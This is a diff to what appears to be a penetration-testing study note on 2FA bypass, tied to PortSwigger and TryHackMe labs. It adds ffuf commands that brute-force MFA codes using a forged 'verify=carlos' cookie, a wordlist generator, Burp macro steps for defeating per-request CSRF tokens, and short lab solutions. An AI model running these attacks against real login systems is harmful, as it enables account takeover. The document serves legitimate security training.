@@ -4,7 +4,7 @@ type: technique
 tags: [authentication, exploitation, mfa, portswigger, thm, web]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-21
+date_updated: 2026-09-10
 sources: [ps-general-concepts, ps-indepth-attacks, ps-labs-auth, thm-adv-mfa]
 ---
 
@@ -85,6 +85,23 @@ Then brute-force the 4–6 digit code with Burp Intruder. This grants access to 
 - Format: minimum 6 digits (zero-padded)
 - Look for a `302` redirect in the response status
 
+Alternative with ffuf (no Burp Pro required):
+
+```sh
+ffuf -X POST -u "https://TARGET/login2" \
+  -H "Cookie: verify=carlos; session=SESSION_TOKEN" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "mfa-code=FUZZ" \
+  -w /path/to/numbers.txt \
+  -fc 400,401,200
+```
+
+Generate a numbers wordlist (0000–9999) for fuzzing:
+
+```sh
+seq -w 0 9999 > numbers.txt
+```
+
 ### 3. Brute Force 2FA Code
 
 Even without cookie manipulation, if there is no lockout on the 2FA endpoint, brute-force the code directly:
@@ -98,6 +115,20 @@ mfa-code=§0000§
 For 4-digit codes: 10,000 combinations. For 6-digit TOTP: 1,000,000 combinations (but valid only for ~30 seconds, so requires high speed or a rate-limit-free endpoint).
 
 If the application logs the user out after N failed 2FA attempts, automate the full login-plus-2FA sequence using Burp Turbo Intruder or a macro that replays the first-step login before each code attempt.
+
+When the 2FA endpoint uses CSRF tokens that change with each request, a standard Intruder attack fails because every request after the first will have a stale token. Use Burp Suite session handling macros to refresh tokens automatically:
+
+1. Go to **Project Options → Sessions → Session Handling Rules → Add**.
+2. Set the rule to run a **macro** before every Intruder request.
+3. Record the macro using these requests in order:
+   - `GET /login` — fetch fresh CSRF token
+   - `POST /login` — submit valid credentials (re-authenticate)
+   - `GET /login2` — load the 2FA page (establishes fresh 2FA session state)
+4. Configure the macro to extract the CSRF token from `GET /login` and inject it into subsequent requests.
+5. Send `POST /login2` to Intruder; set the `mfa-code` parameter as the payload position.
+6. Set payload type to **Numbers**, range `0000–9999`, step `1`, min/max integer digits `4`, fraction digits `0`.
+7. Set **Maximum Concurrent Requests** to `1` (ensures macro runs before each request in sequence).
+8. Look for a `302` response; use "Show response in browser" immediately (CSRF token expires quickly).
 
 ### 4. SIM Swapping (Conceptual)
 
@@ -177,6 +208,37 @@ Min fraction digits: 0
 
 - [[burp-suite]] — Intruder for 6-digit code brute force; Turbo Intruder for multi-step automation
 - [[burp-suite]] Macros — automate login step 1 before each 2FA brute-force attempt
+
+## PortSwigger Labs
+
+### Lab 6 — 2FA simple bypass (Apprentice)
+
+Log in with the target's credentials (step 1). When redirected to the 2FA page, manually navigate to `/my-account` instead of completing 2FA. Access is granted because the server issues a session cookie after step 1 without enforcing step 2.
+
+### Lab 7 — 2FA broken logic (Practitioner)
+
+Solved by methodology step 2 (account-cookie manipulation). Alternative with ffuf (no Burp Pro):
+
+```sh
+ffuf -X POST -u "https://TARGET/login2" \
+  -H "Cookie: verify=carlos; session=SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "mfa-code=FUZZ" -w numbers.txt -fc 200
+```
+
+### Lab 14 — 2FA bypass using a brute-force attack (Expert)
+
+The 2FA endpoint uses per-request CSRF tokens, making raw Intruder attacks fail after the first request. Solve with Burp session handling macros:
+
+1. **Project Options → Sessions → Session Handling Rules → Add**
+2. Set rule action to **Run a macro**
+3. Record macro: `GET /login` → `POST /login` → `GET /login2`
+4. Configure macro to extract CSRF token from `GET /login` and propagate it
+5. Add all lab URLs to Burp scope (required for macro to trigger on Intruder requests)
+6. Send `POST /login2` to Intruder; mark `mfa-code` as payload position
+7. Payload: Numbers, 0000–9999, min/max digits = 4, fraction digits = 0
+8. Resource pool: max 1 concurrent request
+9. Look for `302`; show response in browser immediately (tokens expire fast)
 
 ## Sources
 
